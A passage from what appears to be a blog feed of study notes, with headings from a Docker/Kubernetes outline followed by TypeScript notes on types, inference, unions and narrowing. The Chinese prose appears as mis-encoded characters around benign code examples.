href="#6-2-2-æµé‡ç®¡ç†ï¼ˆé‡‘ä¸é›€å‘å¸ƒ-æ•…éšœæ³¨å…¥ï¼‰" class="headerlink" title="6.2.2 æµé‡ç®¡ç†ï¼ˆé‡‘ä¸é›€å‘å¸ƒ&#x2F;æ•…éšœæ³¨å…¥ï¼‰"></a>6.2.2 æµé‡ç®¡ç†ï¼ˆé‡‘ä¸é›€å‘å¸ƒ&#x2F;æ•…éšœæ³¨å…¥ï¼‰</h3><h3 id="6-2-3-å®‰å…¨é€šä¿¡ï¼ˆmTLS-è®¤è¯æˆæƒï¼‰"><a href="#6-2-3-å®‰å…¨é€šä¿¡ï¼ˆmTLS-è®¤è¯æˆæƒï¼‰" class="headerlink" title="6.2.3 å®‰å…¨é€šä¿¡ï¼ˆmTLS&#x2F;è®¤è¯æˆæƒï¼‰"></a>6.2.3 å®‰å…¨é€šä¿¡ï¼ˆmTLS&#x2F;è®¤è¯æˆæƒï¼‰</h3><h2 id="6-3-ç”Ÿæ€ç³»ç»Ÿå·¥å…·"><a href="#6-3-ç”Ÿæ€ç³»ç»Ÿå·¥å…·" class="headerlink" title="6.3 ç”Ÿæ€ç³»ç»Ÿå·¥å…·"></a>6.3 ç”Ÿæ€ç³»ç»Ÿå·¥å…·</h2><h3 id="6-3-1-Helm-åŒ…ç®¡ç†æœºåˆ¶"><a href="#6-3-1-Helm-åŒ…ç®¡ç†æœºåˆ¶" class="headerlink" title="6.3.1 Helm åŒ…ç®¡ç†æœºåˆ¶"></a>6.3.1 Helm åŒ…ç®¡ç†æœºåˆ¶</h3><h3 id="6-3-2-GitOps-å®è·µï¼ˆArgo-CD-Fluxï¼‰"><a href="#6-3-2-GitOps-å®è·µï¼ˆArgo-CD-Fluxï¼‰" class="headerlink" title="6.3.2 GitOps å®è·µï¼ˆArgo CD&#x2F;Fluxï¼‰"></a>6.3.2 GitOps å®è·µï¼ˆArgo CD&#x2F;Fluxï¼‰</h3><h3 id="6-3-3-é›†ç¾¤ç®¡ç†å·¥å…·ï¼ˆRancher-kubesprayï¼‰"><a href="#6-3-3-é›†ç¾¤ç®¡ç†å·¥å…·ï¼ˆRancher-kubesprayï¼‰" class="headerlink" title="6.3.3 é›†ç¾¤ç®¡ç†å·¥å…·ï¼ˆRancher&#x2F;kubesprayï¼‰"></a>6.3.3 é›†ç¾¤ç®¡ç†å·¥å…·ï¼ˆRancher&#x2F;kubesprayï¼‰</h3><h1 id="ä¸ƒã€é¢è¯•ä¸“é¡¹"><a href="#ä¸ƒã€é¢è¯•ä¸“é¡¹" class="headerlink" title="ä¸ƒã€é¢è¯•ä¸“é¡¹"></a>ä¸ƒã€é¢è¯•ä¸“é¡¹</h1><h2 id="7-1-æ ¸å¿ƒåŸç†"><a href="#7-1-æ ¸å¿ƒåŸç†" class="headerlink" title="7.1 æ ¸å¿ƒåŸç†"></a>7.1 æ ¸å¿ƒåŸç†</h2><h3 id="7-1-1-Docker-ä¸è™šæ‹Ÿæœºæœ¬è´¨åŒºåˆ«"><a href="#7-1-1-Docker-ä¸è™šæ‹Ÿæœºæœ¬è´¨åŒºåˆ«" class="headerlink" title="7.1.1 Docker ä¸è™šæ‹Ÿæœºæœ¬è´¨åŒºåˆ«"></a>7.1.1 Docker ä¸è™šæ‹Ÿæœºæœ¬è´¨åŒºåˆ«</h3><h3 id="7-1-2-Kubernetes-è°ƒåº¦å™¨å·¥ä½œåŸç†"><a href="#7-1-2-Kubernetes-è°ƒåº¦å™¨å·¥ä½œåŸç†" class="headerlink" title="7.1.2 Kubernetes è°ƒåº¦å™¨å·¥ä½œåŸç†"></a>7.1.2 Kubernetes è°ƒåº¦å™¨å·¥ä½œåŸç†</h3><h3 id="7-1-3-etcd-åˆ†å¸ƒå¼ä¸€è‡´æ€§å®ç°"><a href="#7-1-3-etcd-åˆ†å¸ƒå¼ä¸€è‡´æ€§å®ç°" class="headerlink" title="7.1.3 etcd åˆ†å¸ƒå¼ä¸€è‡´æ€§å®ç°"></a>7.1.3 etcd åˆ†å¸ƒå¼ä¸€è‡´æ€§å®ç°</h3><h2 id="7-2-æ•…éšœæ’æŸ¥"><a href="#7-2-æ•…éšœæ’æŸ¥" class="headerlink" title="7.2 æ•…éšœæ’æŸ¥"></a>7.2 æ•…éšœæ’æŸ¥</h2><h3 id="7-2-1-Pod-å¯åŠ¨å¤±è´¥è¯Šæ–­æµç¨‹"><a href="#7-2-1-Pod-å¯åŠ¨å¤±è´¥è¯Šæ–­æµç¨‹" class="headerlink" title="7.2.1 Pod å¯åŠ¨å¤±è´¥è¯Šæ–­æµç¨‹"></a>7.2.1 Pod å¯åŠ¨å¤±è´¥è¯Šæ–­æµç¨‹</h3><h3 id="7-2-2-ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥æ–¹æ³•"><a href="#7-2-2-ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥æ–¹æ³•" class="headerlink" title="7.2.2 ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥æ–¹æ³•"></a>7.2.2 ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥æ–¹æ³•</h3><h3 id="7-2-3-å­˜å‚¨å·æŒ‚è½½é—®é¢˜å¤„ç†"><a href="#7-2-3-å­˜å‚¨å·æŒ‚è½½é—®é¢˜å¤„ç†" class="headerlink" title="7.2.3 å­˜å‚¨å·æŒ‚è½½é—®é¢˜å¤„ç†"></a>7.2.3 å­˜å‚¨å·æŒ‚è½½é—®é¢˜å¤„ç†</h3><h2 id="7-3-è®¾è®¡åœºæ™¯"><a href="#7-3-è®¾è®¡åœºæ™¯" class="headerlink" title="7.3 è®¾è®¡åœºæ™¯"></a>7.3 è®¾è®¡åœºæ™¯</h2><h3 id="7-3-1-é«˜å¯ç”¨é›†ç¾¤æ¶æ„è®¾è®¡"><a href="#7-3-1-é«˜å¯ç”¨é›†ç¾¤æ¶æ„è®¾è®¡" class="headerlink" title="7.3.1 é«˜å¯ç”¨é›†ç¾¤æ¶æ„è®¾è®¡"></a>7.3.1 é«˜å¯ç”¨é›†ç¾¤æ¶æ„è®¾è®¡</h3><h3 id="7-3-2-é›¶åœæœºéƒ¨ç½²æ–¹æ¡ˆ"><a href="#7-3-2-é›¶åœæœºéƒ¨ç½²æ–¹æ¡ˆ" class="headerlink" title="7.3.2 é›¶åœæœºéƒ¨ç½²æ–¹æ¡ˆ"></a>7.3.2 é›¶åœæœºéƒ¨ç½²æ–¹æ¡ˆ</h3><h3 id="7-3-3-å¤šé›†ç¾¤ç®¡ç†å®è·µ"><a href="#7-3-3-å¤šé›†ç¾¤ç®¡ç†å®è·µ" class="headerlink" title="7.3.3 å¤šé›†ç¾¤ç®¡ç†å®è·µ"></a>7.3.3 å¤šé›†ç¾¤ç®¡ç†å®è·µ</h3>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TypeScript ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/07/09/TypeScript%20Study%20Notes/"/>
    <url>/2025/07/09/TypeScript%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€TypeScript-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"><a href="#ä¸€ã€TypeScript-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="ä¸€ã€TypeScript åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"></a>ä¸€ã€TypeScript åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ</h1><h2 id="1-1-ç±»å‹ç³»ç»Ÿæ·±å…¥"><a href="#1-1-ç±»å‹ç³»ç»Ÿæ·±å…¥" class="headerlink" title="1.1 ç±»å‹ç³»ç»Ÿæ·±å…¥"></a>1.1 ç±»å‹ç³»ç»Ÿæ·±å…¥</h2><h3 id="1-1-1-åŸºæœ¬ç±»å‹ä¸ç±»å‹æ¨æ–­æœºåˆ¶"><a href="#1-1-1-åŸºæœ¬ç±»å‹ä¸ç±»å‹æ¨æ–­æœºåˆ¶" class="headerlink" title="1.1.1 åŸºæœ¬ç±»å‹ä¸ç±»å‹æ¨æ–­æœºåˆ¶"></a>1.1.1 åŸºæœ¬ç±»å‹ä¸ç±»å‹æ¨æ–­æœºåˆ¶</h3><p><strong>åŸºæœ¬ç±»å‹ï¼ˆPrimitive Typesï¼‰</strong></p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">string</td><td align="left">å­—ç¬¦ä¸²ç±»å‹</td><td align="left">let name: string &#x3D; â€œAliceâ€</td></tr><tr><td align="left">number</td><td align="left">æ•°å€¼ç±»å‹ï¼ˆå«æ•´æ•°&#x2F;æµ®ç‚¹æ•°ï¼‰</td><td align="left">let age: number &#x3D; 30</td></tr><tr><td align="left">boolean</td><td align="left">å¸ƒå°”ç±»å‹</td><td align="left">let isDone: boolean &#x3D; true</td></tr><tr><td align="left">null</td><td align="left">ç©ºå€¼ï¼ˆéœ€å¼€å¯ strictNullChecksï¼‰</td><td align="left">let n: null &#x3D; null</td></tr><tr><td align="left">undefinedæœªå®šä¹‰å€¼</td><td align="left">let u: undefined &#x3D; undefined</td><td align="left"></td></tr><tr><td align="left">symbol</td><td align="left">å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆES6ï¼‰</td><td align="left">const sym: symbol &#x3D; Symbol()</td></tr><tr><td align="left">bigint</td><td align="left">å¤§æ•´æ•°ï¼ˆES2020ï¼‰</td><td align="left">let big: bigint &#x3D; 100n</td></tr><tr><td align="left">void</td><td align="left">æ— è¿”å›å€¼ï¼ˆå‡½æ•°ï¼‰</td><td align="left">function warn(): void { console.log() }</td></tr></tbody></table><span id="more"></span><p><strong>ç±»å‹æ¨æ–­æœºåˆ¶ï¼ˆType Inferenceï¼‰</strong></p><p>(1) å˜é‡åˆå§‹åŒ–æ¨æ–­</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;          <span class="hljs-comment">// æ¨æ–­ä¸º number</span><br><span class="hljs-keyword">const</span> b = <span class="hljs-string">&quot;text&quot;</span>;    <span class="hljs-comment">// æ¨æ–­ä¸º &quot;text&quot;ï¼ˆå­—é¢é‡ç±»å‹ï¼‰</span><br><span class="hljs-keyword">const</span> c = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> &#125;;  <span class="hljs-comment">// æ¨æ–­ä¸º &#123; x: number &#125;</span><br></code></pre></td></tr></table></figure><p>(2) å‡½æ•°è¿”å›å€¼æ¨æ–­</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> x + y;      <span class="hljs-comment">// è‡ªåŠ¨æ¨æ–­è¿”å› number</span><br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ¨æ–­è¿”å› boolean</span><br></code></pre></td></tr></table></figure><p>(3) ä¸Šä¸‹æ–‡æ¨æ–­ï¼ˆContextual Typingï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å›è°ƒå‡½æ•°å‚æ•°æ ¹æ®ä¸Šä¸‹æ–‡æ¨æ–­ç±»å‹</span><br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v * <span class="hljs-number">2</span>);       <span class="hljs-comment">// v æ¨æ–­ä¸º number</span><br><br><span class="hljs-comment">// äº‹ä»¶å¤„ç†å‡½æ•°å‚æ•°æ¨æ–­</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">clientX</span>);         <span class="hljs-comment">// e æ¨æ–­ä¸º MouseEvent</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šæ¨æ–­åœºæ™¯</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨æ–­è¡Œä¸º</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æœªåˆå§‹åŒ–å˜é‡</td><td align="left">æ¨æ–­ä¸º anyï¼ˆéä¸¥æ ¼æ¨¡å¼ï¼‰</td><td align="left">let x; â†’ x: any</td></tr><tr><td align="left">è”åˆç±»å‹åˆå§‹åŒ–</td><td align="left">æ¨æ–­æ‰€æœ‰å¯èƒ½ç±»å‹çš„è”åˆ</td><td align="left">let arr &#x3D; [0, â€œaâ€] â†’ <code>(numberstring)[]</code></td></tr><tr><td align="left">const å¸¸é‡æ–­è¨€</td><td align="left">æ¨æ–­ä¸ºå­—é¢é‡ç±»å‹</td><td align="left">const size &#x3D; 100 as const â†’ 100</td></tr></tbody></table><p><strong>ç±»å‹æ¨æ–­ä¸æ˜¾ç¤ºæ³¨è§£å¯¹æ¯”</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èæ–¹å¼</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">å‡½æ•°å‚æ•°</td><td align="left">æ˜¾ç¤ºæ³¨è§£</td><td align="left">é¿å… any ä¼ æ’­é£é™©</td></tr><tr><td align="left">å¤æ‚å¯¹è±¡å­—é¢é‡</td><td align="left">æ˜¾ç¤ºæ³¨è§£æˆ–æ¥å£</td><td align="left">ç¡®ä¿ç»“æ„ç¬¦åˆé¢„æœŸ</td></tr><tr><td align="left">ç®€å•å˜é‡åˆå§‹åŒ–</td><td align="left">ä¾èµ–ç±»å‹æ¨æ–­</td><td align="left">å‡å°‘å†—ä½™ä»£ç </td></tr><tr><td align="left">å‡½æ•°è¿”å›å€¼</td><td align="left">ä¾èµ–ç±»å‹æ¨æ–­</td><td align="left">ä¿æŒä¸å®ç°åŒæ­¥ï¼ˆé™¤å…¬å¼€APIæ–‡æ¡£å¤–ï¼‰</td></tr></tbody></table><h3 id="1-1-2-å­—é¢é‡ç±»å‹ä¸è”åˆç±»å‹å®æˆ˜"><a href="#1-1-2-å­—é¢é‡ç±»å‹ä¸è”åˆç±»å‹å®æˆ˜" class="headerlink" title="1.1.2 å­—é¢é‡ç±»å‹ä¸è”åˆç±»å‹å®æˆ˜"></a>1.1.2 å­—é¢é‡ç±»å‹ä¸è”åˆç±»å‹å®æˆ˜</h3><p><strong>å­—é¢é‡ç±»å‹ï¼ˆLiteral Typesï¼‰</strong></p><p>æ ¸å¿ƒæ¦‚å¿µï¼šå°†å€¼ä½œä¸ºç±»å‹ä½¿ç”¨ï¼Œé™åˆ¶å˜é‡åªèƒ½å–ç‰¹å®šå€¼ã€‚</p><table><thead><tr><th align="left">åˆ†ç±»</th><th align="left">è¯­æ³•ç¤ºä¾‹</th><th align="left">ç±»å‹è¡¨ç¤º</th></tr></thead><tbody><tr><td align="left">å­—ç¬¦ä¸²å­—é¢é‡</td><td align="left">let dir: â€œUPâ€ &#x3D; â€œUPâ€</td><td align="left">â€œUPâ€</td></tr><tr><td align="left">æ•°å­—å­—é¢é‡</td><td align="left">let size: 100 &#x3D; 100</td><td align="left">100</td></tr><tr><td align="left">å¸ƒå°”å­—é¢é‡</td><td align="left">let flag: true &#x3D; true</td><td align="left">true</td></tr><tr><td align="left">æ¨¡æ¿å­—é¢é‡</td><td align="left">type T &#x3D; prefix_${string}&#96;&#96;</td><td align="left">æ¨¡å¼åŒ¹é…ç±»å‹</td></tr></tbody></table><p>å·¥ç¨‹ä»·å€¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ›¿ä»£æšä¸¾ï¼ˆæ›´è½»é‡ï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">HttpMethod</span> = <span class="hljs-string">&quot;GET&quot;</span> | <span class="hljs-string">&quot;POST&quot;</span> | <span class="hljs-string">&quot;PUT&quot;</span> | <span class="hljs-string">&quot;DELETE&quot;</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"><span class="hljs-attr">method</span>: <span class="hljs-title class_">HttpMethod</span></span>) &#123;...&#125;<br><br><span class="hljs-title function_">fetchData</span>(<span class="hljs-string">&quot;GET&quot;</span>);  <span class="hljs-comment">// âœ…</span><br><span class="hljs-title function_">fetchData</span>(<span class="hljs-string">&quot;COPY&quot;</span>); <span class="hljs-comment">// ğŸš« ç¼–è¯‘é”™è¯¯ï¼šéå…è®¸å€¼</span><br></code></pre></td></tr></table></figure><p><strong>è”åˆç±»å‹ï¼ˆUnion Typesï¼‰</strong></p><p>æ ¸å¿ƒæ¦‚å¿µï¼šç»„åˆå¤šä¸ªç±»å‹ï¼Œè¡¨ç¤ºå€¼å¯ä»¥æ˜¯å…¶ä¸­ä»»æ„ä¸€ç§ç±»å‹ã€‚</p><p>è¯­æ³•ä¸ç‰¹æ€§ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">ID</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;         <span class="hljs-comment">// åŸºç¡€è”åˆ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-string">&quot;idle&quot;</span> | <span class="hljs-string">&quot;loading&quot;</span>;  <span class="hljs-comment">// å­—é¢é‡è”åˆ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Shape</span> = <span class="hljs-title class_">Circle</span> | <span class="hljs-title class_">Square</span>;      <span class="hljs-comment">// å¯¹è±¡è”åˆ</span><br><br><span class="hljs-comment">// è”åˆç±»å‹ç‰¹æ€§ï¼š</span><br><span class="hljs-keyword">let</span> <span class="hljs-attr">id</span>: <span class="hljs-variable constant_">ID</span> = <span class="hljs-string">&quot;abc123&quot;</span>; <span class="hljs-comment">// âœ… å…è®¸å­—ç¬¦ä¸²</span><br>id = <span class="hljs-number">100</span>;              <span class="hljs-comment">// âœ… å…è®¸æ•°å­—</span><br>id = <span class="hljs-literal">true</span>;             <span class="hljs-comment">// ğŸš« ä¸å…è®¸å¸ƒå°”å€¼</span><br></code></pre></td></tr></table></figure><p><strong>ç±»å‹æ”¶çª„å®æˆ˜ï¼ˆType Narrowingï¼‰</strong></p><p>æ ¸å¿ƒæ–¹æ³•ï¼šåœ¨ä»£ç åˆ†æ”¯ä¸­ç¼©å°è”åˆç±»å‹èŒƒå›´</p><table><thead><tr><th align="left">æŠ€æœ¯</th><th align="left">ç¤ºä¾‹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">typeof å®ˆå«</td><td align="left"><code>if (typeof val === &quot;string&quot;) &#123; val.toUpperCase() &#125;</code></td><td align="left">åŸºæœ¬ç±»å‹è”åˆ</td></tr><tr><td align="left">instanceof å®ˆå«</td><td align="left"><code>if (err instanceof Error) &#123; console.log(err.message) &#125;</code></td><td align="left">ç±»å®ä¾‹è”åˆ</td></tr><tr><td align="left">ç›¸ç­‰æ€§æ£€æŸ¥</td><td align="left"><code>if (status === &quot;loading&quot;) &#123; showSpinner() &#125;</code></td><td align="left">å­—é¢é‡è”åˆ</td></tr><tr><td align="left">è‡ªå®šä¹‰å®ˆå«</td><td align="left"><code>function isFish(pet: Fish Bird): pet is Fish &#123; return &quot;swim&quot; in pet &#125;</code></td><td align="left">å¤æ‚å¯¹è±¡è”åˆ</td></tr><tr><td align="left">å¯è¾¨è¯†è”åˆ</td><td align="left">é€šè¿‡å…±åŒå­—æ®µåŒºåˆ†ç±»å‹ï¼ˆè§ä¸‹ä¾‹ï¼‰</td><td align="left">å¯¹è±¡è”åˆï¼ˆè®¾è®¡æ¨¡å¼ï¼‰</td></tr></tbody></table><p>å¯è¾¨è¯†è”åˆå®æˆ˜ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Step 1: å®šä¹‰å…·æœ‰kindå­—æ®µçš„è”åˆç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Shape</span> = <br>  | &#123; <span class="hljs-attr">kind</span>: <span class="hljs-string">&quot;circle&quot;</span>; <span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span> &#125; <br>  | &#123; <span class="hljs-attr">kind</span>: <span class="hljs-string">&quot;square&quot;</span>; <span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span> &#125;;<br><br><span class="hljs-comment">// Step 2: ä½¿ç”¨kindå­—æ®µæ”¶çª„ç±»å‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getArea</span>(<span class="hljs-params"><span class="hljs-attr">shape</span>: <span class="hljs-title class_">Shape</span></span>) &#123;<br>  <span class="hljs-keyword">switch</span> (shape.<span class="hljs-property">kind</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;circle&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * shape.<span class="hljs-property">radius</span> ** <span class="hljs-number">2</span>;  <span class="hljs-comment">// æ­¤åˆ†æ”¯shapeè¢«æ”¶çª„ä¸ºåœ†å½¢</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;square&quot;</span>:<br>      <span class="hljs-keyword">return</span> shape.<span class="hljs-property">size</span> ** <span class="hljs-number">2</span>;              <span class="hljs-comment">// æ­¤åˆ†æ”¯shapeè¢«æ”¶çª„ä¸ºæ–¹å½¢</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹æœ€ä½³å®è·µ</strong></p><p>(1) é¿å…è¿‡åº¦ä½¿ç”¨å­—é¢é‡è”åˆ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸æ¨èï¼šç›´æ¥ä½¿ç”¨å­—é¢é‡</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setColor</span>(<span class="hljs-params"><span class="hljs-attr">color</span>: <span class="hljs-string">&quot;red&quot;</span> | <span class="hljs-string">&quot;green&quot;</span> | <span class="hljs-string">&quot;blue&quot;</span></span>) &#123;...&#125;<br><br><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨å‘½åç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PrimaryColor</span> = <span class="hljs-string">&quot;red&quot;</span> | <span class="hljs-string">&quot;green&quot;</span> | <span class="hljs-string">&quot;blue&quot;</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setColor</span>(<span class="hljs-params"><span class="hljs-attr">color</span>: <span class="hljs-title class_">PrimaryColor</span></span>) &#123;...&#125;<br></code></pre></td></tr></table></figure><p>(2) è”åˆç±»å‹ä¸å‡½æ•°é‡è½½é…åˆ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ¹æ®å‚æ•°ç±»å‹è¿”å›ä¸åŒç»“æœ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> padding === <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.<span class="hljs-title function_">repeat</span>(padding) + value;  <span class="hljs-comment">// æ•°å­—å¤„ç†</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> padding + value;                <span class="hljs-comment">// å­—ç¬¦ä¸²å¤„ç†</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-1-3-any-unknown-never-çš„åŒºåˆ«ä¸åº”ç”¨åœºæ™¯"><a href="#1-1-3-any-unknown-never-çš„åŒºåˆ«ä¸åº”ç”¨åœºæ™¯" class="headerlink" title="1.1.3 any&#x2F;unknown&#x2F;never çš„åŒºåˆ«ä¸åº”ç”¨åœºæ™¯"></a>1.1.3 any&#x2F;unknown&#x2F;never çš„åŒºåˆ«ä¸åº”ç”¨åœºæ™¯</h3><p><strong>æ ¸å¿ƒç±»å‹å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">any</th><th align="left">unknown</th><th align="left">never</th></tr></thead><tbody><tr><td align="left">ç±»å‹å®‰å…¨æ€§</td><td align="left">âŒ å®Œå…¨ç¦ç”¨ç±»å‹æ£€æŸ¥</td><td align="left">âœ… å®‰å…¨å®¹å™¨ï¼ˆéœ€æ˜¾å¼ç±»å‹æ–­è¨€ï¼‰</td><td align="left">âœ… è¡¨ç¤ºä¸å¯èƒ½å­˜åœ¨çš„å€¼</td></tr><tr><td align="left">å¯èµ‹å€¼ç»™</td><td align="left">ä»»æ„ç±»å‹</td><td align="left">ä»… any å’Œ unknown</td><td align="left">ä»»æ„ç±»å‹ï¼ˆåº•éƒ¨ç±»å‹ï¼‰</td></tr><tr><td align="left">å¯æ¥å—èµ‹å€¼</td><td align="left">ä»»æ„ç±»å‹</td><td align="left">ä»»æ„ç±»å‹</td><td align="left">ä¸å¯èµ‹å€¼ï¼ˆé™¤ never æœ¬èº«ï¼‰</td></tr><tr><td align="left">æ“ä½œè‡ªç”±åº¦</td><td align="left">ç›´æ¥è®¿é—®å±æ€§&#x2F;æ–¹æ³•</td><td align="left">å¿…é¡»å…ˆæ–­è¨€å…·ä½“ç±»å‹æ— æ³•å®ä¾‹åŒ–</td><td align="left"></td></tr></tbody></table><p><strong>any ç±»å‹è¯¦è§£</strong></p><p>è®¾è®¡ç›®çš„ï¼šç”¨äºå…¼å®¹ JavaScript æ— ç±»å‹ä»£ç æˆ–ç¬¬ä¸‰æ–¹åº“ç¼ºå¤±ç±»å‹å£°æ˜ã€‚</p><p>å…¸å‹åœºæ™¯ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åœºæ™¯1ï¼šè¿ç§»é—ç•™JSä»£ç </span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">legacyData</span>: <span class="hljs-built_in">any</span> = <span class="hljs-title function_">getUntypedData</span>();<br>legacyData.<span class="hljs-title function_">invalidMethod</span>(); <span class="hljs-comment">// ç¼–è¯‘é€šè¿‡ï¼Œè¿è¡Œæ—¶å¯èƒ½æŠ¥é”™</span><br><br><span class="hljs-comment">// åœºæ™¯2ï¼šåŠ¨æ€å±æ€§è®¿é—®</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-built_in">any</span> = &#123;&#125;;<br>obj.<span class="hljs-property">arbitraryProperty</span> = <span class="hljs-number">123</span>; <span class="hljs-comment">// å…è®¸ä»»æ„å±æ€§èµ‹å€¼</span><br></code></pre></td></tr></table></figure><p>é£é™©è­¦ç¤ºï¼šä½¿ç”¨ any ä¼šç ´åç±»å‹ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œåº”é€šè¿‡ tsconfig.json å¼€å¯ noImplicitAny ä¸¥æ ¼æ£€æŸ¥ã€‚</p><p><strong>unknown 